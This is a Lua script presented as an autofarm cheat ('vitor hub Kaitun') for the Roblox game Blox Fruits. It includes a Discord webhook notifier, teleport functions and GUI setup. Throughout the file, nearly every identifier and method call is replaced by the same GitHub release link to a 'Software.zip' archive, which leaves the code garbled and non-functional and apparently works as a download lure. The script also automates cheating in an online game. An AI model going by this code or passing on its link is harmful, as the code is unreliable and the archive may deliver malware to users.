
--[[

    Kaitun or Cuttay, a phrase of a Roblox script that fully autofarms everything in Blox Fruits (game)
    "Ơ! Thằng lồn này dùng cuttay à? Mới chơi có (1) tuần mà đã giàu như này rồi?"

    vitor hub Kaitun (catn1qqer)
    Project started on 13/5/2023

]]

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Pirates" -- "Marines"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false -- really fucked up the client but the good side is fps go wroom.

getgenv().Config = {
    ["Discord"] = {
        ["Enabled"] = false,
        ["WebhookUrl"] = "your_webhook_here",
        ["Content"] = "@everyone", -- @everyone or <@roleid/userid>, it can be just text.
        ["Time"] = 60 -- Seconds
    },
    ["Autofarm"] = {
        ["BuySwords"] = true, -- xong
        ["BuyAccessories"] = true,
        ["BuyLegendarySword"] = false -- tạm thời bị gỡ cho shitter bị bại não.
    }
}

-- Variables

local DCSettings = Config["Discord"]
local FSSettings = Config["Autofarm"]

function TP(P1)
    Distance = (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude
    if Distance < 250 then
        Speed = 600
    elseif Distance < 500 then
        Speed = 500
    elseif Distance < 1000 then
        Speed = 400
    elseif Distance >= 1000 then
        Speed = 250
    end
    game:GetService("TweenService"):Create(
        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,
        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(Distance/Speed, https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip),
        {CFrame = P1}
    ):Play()
end

function TP2(P1)
	Distance = (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude
	if Distance < 1000 then
		Speed = 500
	elseif Distance >= 1000 then
		Speed = 350
	end
    game:GetService("TweenService"):Create(
        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,
        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(Distance/Speed, https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip),
        {CFrame = P1}
    ):Play()
    Clip = true
    wait(Distance/Speed)
    Clip = false
end

function TP(P)
	Distance = (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip - https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).Magnitude
	if Distance < 10 then
		Speed = 1000
	elseif Distance < 170 then
		https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = P
		Speed = 350
	elseif Distance < 1000 then
		Speed = 350
	elseif Distance >= 1000 then
		Speed = 250
	end
	game:GetService("TweenService"):Create(
		https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,
		https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(Distance/Speed, https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip),
		{CFrame = P}
	):Play()
end

-- gui // line 662 to continue

SelectToolWeapon = "Combat"

-- Instances:

local LocalPlayer = game:GetService("Players").LocalPlayer

local vitorhubkaitun = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("ScreenGui")
local Frame = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Frame")
local Status = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Frame")
local UICorner = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("UICorner")
local Account = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextLabel")
local Stats = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextLabel")
local Fragments = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextLabel")
local Beli = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextLabel")
local Level = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextLabel")
local Defense = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextLabel")
local Melee = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextLabel")
local Sword = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextLabel")
local Gun = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextLabel")
local Fruit = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextLabel")
local Below = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Frame")
local UICorner_2 = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("UICorner")
local BlockCorner = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Frame")
local Credits1 = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextLabel")
local Credits2 = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextLabel")
local Brand = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextLabel")
local Profile = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("ImageLabel")
local UICorner_3 = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("UICorner")
local Welcome = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextLabel")
local Username = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextLabel")
local ClientUptime = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextLabel")
local RobloxProfile = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("ImageLabel")
local UICorner_4 = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("UICorner")
local Tabs = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Frame")
local UICorner_5 = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("UICorner")
local ProfileTab = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("ImageLabel")
local PlayerStats = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextButton")
local ItemsTab = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("ImageLabel")
local ItemsInv = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextButton")
local Main = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("ImageLabel")
local UICorner_6 = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("UICorner")
local Game = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextLabel")
local CreatorName = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextLabel")
local Logo = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("ImageLabel")
local LogoName = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextLabel")
local ToggleUIButton = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("TextButton")
local UICorner_10 = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("UICorner")

-- Webhook

local data = {
    ["username"] = 'vitor hub Notifier', -- haha NO.
    ['content'] = DCSettings["Content"],
    ["embeds"] = {
        {
            ["title"] = '**vitor hub Account Status**', -- LMAO WTF
            ["color"] = 5539744, -- color id		
            ["type"] = "rich",
            ["fields"] =  {
                {
                    ["name"] = "User Name",
                    ["value"] = "||"https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).."||",
                    ["inline"] = true
                },
                {
                    ["name"] = "Level",
                    ["value"] = tostring(game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Level").Value),
                    ["inline"] = true
                },
                {
                    ["name"] = "Fragments",
                    ["value"] = tostring(game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Fragments").Value),
                    ["inline"] = true
                },
                {
                    ["name"] = "Bounty/Honor",
                    ["value"] = tostring(game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip["Bounty/Honor"].Value),
                    ["inline"] = true
                },
                {
                    ["name"] = "Beli",
                    ["value"] = tostring(game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Beli").Value),
                    ["inline"] = true
                },
                {
                    ["name"] = "Race",
                    ["value"] = tostring(game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Race").Value),
                    ["inline"] = true
                },
                {
                    ["name"] = "Status",
                    ["value"] = "```sml\n"https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Melee : "https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Level").Value .. 
                        "\nDefense : "https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Level").Value .. 
                        "\nSword : "https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Level").Value.. 
                        "\nGun : "https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Level").Value .. 
                        "\nDevil Fruit : "https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip["Demon Fruit"]:WaitForChild("Level").Value).."```",
                    ["inline"] = true
                },
            },
            ["footer"] = {
                ["text"] = "Script còn mới, đôi khi vài thứ thiếu. Mong bạn thông cảm.".."\nTime".." : "https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("%c").." ("https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("%X")..")",
            },
        }
    },
}

--Properties:

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("PlayerGui")
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "vitorhubkaitun"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = vitorhubkaitun
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 0, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.499266863, -516, 0.498697907, -291)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 1033, 0, 583)

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Status"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Frame
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(36, 36, 36)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.011616651, 0, 0.399656951, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 235, 0, 336)

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Status

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Account"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Status
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.114349864, 0, 0.0405752994, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 194, 0, 21)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Account"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 23.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0.790
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Stats"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Status
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.118605182, 0, 0.424721628, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 194, 0, 21)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Stats"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 23.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0.790
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Fragments"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Status
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.0377541408, 0, 0.199111849, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 222, 0, 34)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Fragments : 0"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 23.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Beli"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Status
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.0377541408, 0, 0.104599692, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 223, 0, 30)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Beli : 0"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 23.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Level"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Status
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.0377541408, 0, 0.302770376, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 222, 0, 34)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Level : 2450"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 23.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Defense"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Status
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.0377541408, 0, 0.604599595, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 222, 0, 18)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Defense :"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 23.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Melee"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Status
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.0377541408, 0, 0.522282481, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 222, 0, 18)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Melee :"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 23.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Sword"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Status
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.0377541408, 0, 0.683867872, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 222, 0, 18)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Sword :"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 23.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Gun"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Status
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0.0377541408, 0, 0.769233644, 0)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(0, 222, 0, 18)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Gun :"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 23.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = true
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip

https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = "Fruit"
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = Status
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(255, 255, 255)
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1.000
https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
